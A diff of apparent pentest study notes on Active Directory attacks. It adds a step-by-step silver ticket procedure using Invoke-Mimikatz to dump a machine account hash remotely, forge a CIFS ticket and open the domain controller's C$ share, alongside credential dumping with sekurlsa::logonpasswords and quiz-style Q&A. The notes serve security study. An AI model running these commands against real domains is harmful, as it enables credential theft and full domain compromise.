@@ -156,7 +156,7 @@ To get administrator NTLM hash
 ------------------------------
 [seclogs.research.Security.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
 
-To use administrator's NTLM hash and get administrative access
+To use domain admin's NTLM hash and get administrative access
 ---------------------------------------------------------------
 C:\> powershell -ep bypass
 C:\> . .\Invoke-Mimikatz.ps1
@@ -179,6 +179,32 @@ How does Mimikatz facilitate pass-the-ticket attacks in Active Directory? > By d
 
 Which Mimikatz command is used to extract Kerberos tickets from memory for pass-the-ticket attacks? > "sekurlsa::tickets"
 _______________________________________________________________________________________________________________________________________________________________________________________________
+Silver ticket
+-------------
+1. Pass the hash to domain admin
+2. Get the domain controller (KDC) --> user : PROD$ hash NTLM
+
+C:> invoke-mimikatz -command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local
+
+3. Generate silver ticket to the administrator with KDC
+
+C:> invoke-mimikatz -command '"kerberos::golden /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440(domin-user) /target:prod.research.security.local /service:CIFS /rc4:f2c8slad8245023845(KDC's NTLM hash) 
+/user:administrator /ptt"'
+
+4. Check the ticket
+C:> klist 
+
+5. Finally can access the domain controller
+ls \\prod.research.security.local\c$
+_______________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+
+_______________________________________________________________________________________________________________________________________________________________________________________________
+
 Golden ticket attack > kerberos identity authentication protocol attack > krbtgt(a service account that issues with kerberos ticket)
 
 What is the primary objective of a Golden Ticket attack in Active Directory? > To impersonate legitimate users and access network resources without detection
